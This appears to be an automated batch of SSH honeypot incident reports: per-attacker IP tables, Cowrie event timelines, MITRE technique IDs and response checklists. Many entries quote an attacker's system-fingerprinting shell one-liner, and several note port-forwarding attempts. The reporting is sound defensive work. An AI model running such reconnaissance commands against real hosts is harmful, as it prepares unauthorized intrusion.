### 🔴 HIGH · IR-cb747caccd4c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:13 |
| **Last Seen** | 2026-07-30 02:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:13:24` | `cowrie.session.connect` |
| `2026-07-30 02:13:25` | `cowrie.client.version` |
| `2026-07-30 02:13:25` | `cowrie.client.kex` |
| `2026-07-30 02:13:26` | `cowrie.login.success` |
| `2026-07-30 02:13:27` | `cowrie.session.params` |
| `2026-07-30 02:13:27` | `cowrie.command.input` |
| `2026-07-30 02:13:27` | `cowrie.command.input` |
| `2026-07-30 02:13:27` | `cowrie.command.input` |
| `2026-07-30 02:13:27` | `cowrie.command.input` |
| `2026-07-30 02:13:27` | `cowrie.command.input` |
| `2026-07-30 02:13:27` | `cowrie.command.success` |
| `2026-07-30 02:13:27` | `cowrie.command.input` |
| `2026-07-30 02:13:27` | `cowrie.command.input` |
| `2026-07-30 02:13:27` | `cowrie.command.input` |
| `2026-07-30 02:13:27` | `cowrie.command.input` |
| `2026-07-30 02:13:28` | `cowrie.log.closed` |
| `2026-07-30 02:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15a30f7f6480

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]9` |
| **First Seen** | 2026-07-30 02:13 |
| **Last Seen** | 2026-07-30 02:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:13:27` | `cowrie.session.connect` |
| `2026-07-30 02:13:27` | `cowrie.client.version` |
| `2026-07-30 02:13:27` | `cowrie.client.kex` |
| `2026-07-30 02:13:30` | `cowrie.login.success` |
| `2026-07-30 02:13:31` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]9` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0d74aa5b1cf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:14 |
| **Last Seen** | 2026-07-30 02:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:14:50` | `cowrie.session.connect` |
| `2026-07-30 02:14:50` | `cowrie.client.version` |
| `2026-07-30 02:14:50` | `cowrie.client.kex` |
| `2026-07-30 02:14:52` | `cowrie.login.success` |
| `2026-07-30 02:14:53` | `cowrie.session.params` |
| `2026-07-30 02:14:53` | `cowrie.command.input` |
| `2026-07-30 02:14:53` | `cowrie.command.input` |
| `2026-07-30 02:14:53` | `cowrie.command.input` |
| `2026-07-30 02:14:53` | `cowrie.command.input` |
| `2026-07-30 02:14:53` | `cowrie.command.input` |
| `2026-07-30 02:14:53` | `cowrie.command.success` |
| `2026-07-30 02:14:53` | `cowrie.command.input` |
| `2026-07-30 02:14:53` | `cowrie.command.input` |
| `2026-07-30 02:14:53` | `cowrie.command.input` |
| `2026-07-30 02:14:53` | `cowrie.command.input` |
| `2026-07-30 02:14:54` | `cowrie.log.closed` |
| `2026-07-30 02:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c7d46c57819

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:16 |
| **Last Seen** | 2026-07-30 02:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:16:19` | `cowrie.session.connect` |
| `2026-07-30 02:16:19` | `cowrie.client.version` |
| `2026-07-30 02:16:19` | `cowrie.client.kex` |
| `2026-07-30 02:16:19` | `cowrie.login.success` |
| `2026-07-30 02:16:21` | `cowrie.session.params` |
| `2026-07-30 02:16:21` | `cowrie.command.input` |
| `2026-07-30 02:16:21` | `cowrie.command.input` |
| `2026-07-30 02:16:21` | `cowrie.command.input` |
| `2026-07-30 02:16:21` | `cowrie.command.input` |
| `2026-07-30 02:16:21` | `cowrie.command.input` |
| `2026-07-30 02:16:21` | `cowrie.command.success` |
| `2026-07-30 02:16:21` | `cowrie.command.input` |
| `2026-07-30 02:16:21` | `cowrie.command.input` |
| `2026-07-30 02:16:21` | `cowrie.command.input` |
| `2026-07-30 02:16:21` | `cowrie.command.input` |
| `2026-07-30 02:16:21` | `cowrie.log.closed` |
| `2026-07-30 02:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa8f541e4064

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:17 |
| **Last Seen** | 2026-07-30 02:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:17:48` | `cowrie.session.connect` |
| `2026-07-30 02:17:48` | `cowrie.client.version` |
| `2026-07-30 02:17:48` | `cowrie.client.kex` |
| `2026-07-30 02:17:49` | `cowrie.login.success` |
| `2026-07-30 02:17:50` | `cowrie.session.params` |
| `2026-07-30 02:17:50` | `cowrie.command.input` |
| `2026-07-30 02:17:50` | `cowrie.command.input` |
| `2026-07-30 02:17:50` | `cowrie.command.input` |
| `2026-07-30 02:17:50` | `cowrie.command.input` |
| `2026-07-30 02:17:50` | `cowrie.command.input` |
| `2026-07-30 02:17:50` | `cowrie.command.success` |
| `2026-07-30 02:17:50` | `cowrie.command.input` |
| `2026-07-30 02:17:50` | `cowrie.command.input` |
| `2026-07-30 02:17:50` | `cowrie.command.input` |
| `2026-07-30 02:17:50` | `cowrie.command.input` |
| `2026-07-30 02:17:51` | `cowrie.log.closed` |
| `2026-07-30 02:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-106f182cd9e8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:19 |
| **Last Seen** | 2026-07-30 02:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:19:17` | `cowrie.session.connect` |
| `2026-07-30 02:19:18` | `cowrie.client.version` |
| `2026-07-30 02:19:18` | `cowrie.client.kex` |
| `2026-07-30 02:19:18` | `cowrie.login.success` |
| `2026-07-30 02:19:20` | `cowrie.session.params` |
| `2026-07-30 02:19:20` | `cowrie.command.input` |
| `2026-07-30 02:19:20` | `cowrie.command.input` |
| `2026-07-30 02:19:20` | `cowrie.command.input` |
| `2026-07-30 02:19:20` | `cowrie.command.input` |
| `2026-07-30 02:19:20` | `cowrie.command.input` |
| `2026-07-30 02:19:20` | `cowrie.command.success` |
| `2026-07-30 02:19:20` | `cowrie.command.input` |
| `2026-07-30 02:19:20` | `cowrie.command.input` |
| `2026-07-30 02:19:20` | `cowrie.command.input` |
| `2026-07-30 02:19:20` | `cowrie.command.input` |
| `2026-07-30 02:19:20` | `cowrie.log.closed` |
| `2026-07-30 02:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-202d04aece97

| Field | Detail |
|---|---|
| **Source IP** | `34.79.68[.]242` |
| **First Seen** | 2026-07-30 02:20 |
| **Last Seen** | 2026-07-30 02:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:20:35` | `cowrie.session.connect` |
| `2026-07-30 02:20:35` | `cowrie.client.version` |
| `2026-07-30 02:20:35` | `cowrie.client.kex` |
| `2026-07-30 02:20:37` | `cowrie.login.success` |
| `2026-07-30 02:20:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.68[.]242` to AbuseIPDB if not already reported
- [ ] Block `34.79.68[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e3f9c51940f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:20 |
| **Last Seen** | 2026-07-30 02:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:20:53` | `cowrie.session.connect` |
| `2026-07-30 02:20:53` | `cowrie.client.version` |
| `2026-07-30 02:20:53` | `cowrie.client.kex` |
| `2026-07-30 02:20:54` | `cowrie.login.success` |
| `2026-07-30 02:20:55` | `cowrie.session.params` |
| `2026-07-30 02:20:55` | `cowrie.command.input` |
| `2026-07-30 02:20:55` | `cowrie.command.input` |
| `2026-07-30 02:20:55` | `cowrie.command.input` |
| `2026-07-30 02:20:55` | `cowrie.command.input` |
| `2026-07-30 02:20:55` | `cowrie.command.input` |
| `2026-07-30 02:20:55` | `cowrie.command.success` |
| `2026-07-30 02:20:55` | `cowrie.command.input` |
| `2026-07-30 02:20:55` | `cowrie.command.input` |
| `2026-07-30 02:20:55` | `cowrie.command.input` |
| `2026-07-30 02:20:55` | `cowrie.command.input` |
| `2026-07-30 02:20:55` | `cowrie.log.closed` |
| `2026-07-30 02:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfe2451998a4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:22 |
| **Last Seen** | 2026-07-30 02:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:22:31` | `cowrie.session.connect` |
| `2026-07-30 02:22:32` | `cowrie.client.version` |
| `2026-07-30 02:22:32` | `cowrie.client.kex` |
| `2026-07-30 02:22:33` | `cowrie.login.success` |
| `2026-07-30 02:22:33` | `cowrie.session.params` |
| `2026-07-30 02:22:33` | `cowrie.command.input` |
| `2026-07-30 02:22:33` | `cowrie.command.input` |
| `2026-07-30 02:22:33` | `cowrie.command.input` |
| `2026-07-30 02:22:33` | `cowrie.command.input` |
| `2026-07-30 02:22:33` | `cowrie.command.input` |
| `2026-07-30 02:22:33` | `cowrie.command.success` |
| `2026-07-30 02:22:33` | `cowrie.command.input` |
| `2026-07-30 02:22:33` | `cowrie.command.input` |
| `2026-07-30 02:22:33` | `cowrie.command.input` |
| `2026-07-30 02:22:33` | `cowrie.command.input` |
| `2026-07-30 02:22:34` | `cowrie.log.closed` |
| `2026-07-30 02:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2991e43fb02e

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-30 02:23 |
| **Last Seen** | 2026-07-30 02:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:23:00` | `cowrie.session.connect` |
| `2026-07-30 02:23:00` | `cowrie.client.version` |
| `2026-07-30 02:23:01` | `cowrie.client.kex` |
| `2026-07-30 02:23:01` | `cowrie.login.success` |
| `2026-07-30 02:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9b9294ca714

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-30 02:23 |
| **Last Seen** | 2026-07-30 02:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:23:00` | `cowrie.session.connect` |
| `2026-07-30 02:23:00` | `cowrie.client.version` |
| `2026-07-30 02:23:01` | `cowrie.client.kex` |
| `2026-07-30 02:23:02` | `cowrie.login.success` |
| `2026-07-30 02:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4cff181fd89

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:24 |
| **Last Seen** | 2026-07-30 02:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:24:10` | `cowrie.session.connect` |
| `2026-07-30 02:24:11` | `cowrie.client.version` |
| `2026-07-30 02:24:11` | `cowrie.client.kex` |
| `2026-07-30 02:24:12` | `cowrie.login.success` |
| `2026-07-30 02:24:13` | `cowrie.session.params` |
| `2026-07-30 02:24:13` | `cowrie.command.input` |
| `2026-07-30 02:24:13` | `cowrie.command.input` |
| `2026-07-30 02:24:13` | `cowrie.command.input` |
| `2026-07-30 02:24:13` | `cowrie.command.input` |
| `2026-07-30 02:24:13` | `cowrie.command.input` |
| `2026-07-30 02:24:13` | `cowrie.command.success` |
| `2026-07-30 02:24:13` | `cowrie.command.input` |
| `2026-07-30 02:24:13` | `cowrie.command.input` |
| `2026-07-30 02:24:13` | `cowrie.command.input` |
| `2026-07-30 02:24:13` | `cowrie.command.input` |
| `2026-07-30 02:24:14` | `cowrie.log.closed` |
| `2026-07-30 02:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10a417260569

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:25 |
| **Last Seen** | 2026-07-30 02:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:25:46` | `cowrie.session.connect` |
| `2026-07-30 02:25:47` | `cowrie.client.version` |
| `2026-07-30 02:25:47` | `cowrie.client.kex` |
| `2026-07-30 02:25:48` | `cowrie.login.success` |
| `2026-07-30 02:25:49` | `cowrie.session.params` |
| `2026-07-30 02:25:49` | `cowrie.command.input` |
| `2026-07-30 02:25:49` | `cowrie.command.input` |
| `2026-07-30 02:25:49` | `cowrie.command.input` |
| `2026-07-30 02:25:49` | `cowrie.command.input` |
| `2026-07-30 02:25:49` | `cowrie.command.input` |
| `2026-07-30 02:25:49` | `cowrie.command.success` |
| `2026-07-30 02:25:49` | `cowrie.command.input` |
| `2026-07-30 02:25:49` | `cowrie.command.input` |
| `2026-07-30 02:25:49` | `cowrie.command.input` |
| `2026-07-30 02:25:49` | `cowrie.command.input` |
| `2026-07-30 02:25:49` | `cowrie.log.closed` |
| `2026-07-30 02:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b1840b08e27

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:27 |
| **Last Seen** | 2026-07-30 02:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:27:17` | `cowrie.session.connect` |
| `2026-07-30 02:27:18` | `cowrie.client.version` |
| `2026-07-30 02:27:18` | `cowrie.client.kex` |
| `2026-07-30 02:27:20` | `cowrie.login.success` |
| `2026-07-30 02:27:21` | `cowrie.session.params` |
| `2026-07-30 02:27:21` | `cowrie.command.input` |
| `2026-07-30 02:27:21` | `cowrie.command.input` |
| `2026-07-30 02:27:21` | `cowrie.command.input` |
| `2026-07-30 02:27:21` | `cowrie.command.input` |
| `2026-07-30 02:27:21` | `cowrie.command.input` |
| `2026-07-30 02:27:21` | `cowrie.command.success` |
| `2026-07-30 02:27:21` | `cowrie.command.input` |
| `2026-07-30 02:27:21` | `cowrie.command.input` |
| `2026-07-30 02:27:21` | `cowrie.command.input` |
| `2026-07-30 02:27:21` | `cowrie.command.input` |
| `2026-07-30 02:27:22` | `cowrie.log.closed` |
| `2026-07-30 02:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0bd5a5b161

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:28 |
| **Last Seen** | 2026-07-30 02:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
